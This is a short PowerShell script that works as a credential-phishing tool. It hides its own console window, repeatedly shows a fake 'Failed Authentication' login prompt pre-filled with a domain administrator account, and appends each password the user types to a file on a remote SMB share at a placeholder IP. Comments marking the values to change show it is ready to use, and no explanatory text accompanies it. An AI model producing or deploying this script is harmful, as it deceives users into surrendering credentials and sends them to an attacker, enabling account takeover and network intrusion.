[console]::WindowWidth=1; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth

$user = 'evilcorp.local\administrator';# CHANGE THIS
$shared_folder = "\\10.10.10.10\C$\"; # CHANGE THIS
$out_file = $shared_folder +"prout.txt";
$pass = "";

while([string]::IsNullOrEmpty($pass)){
    $cred = $host.ui.promptforcredential('Failed Authentication','',$user,[Environment]::UserDomainName);
    if ($cred -eq $null){
        continue;
    }
    $pass = $cred.getnetworkcredential().password;
    echo $pass | Out-File -Append $out_file;
}

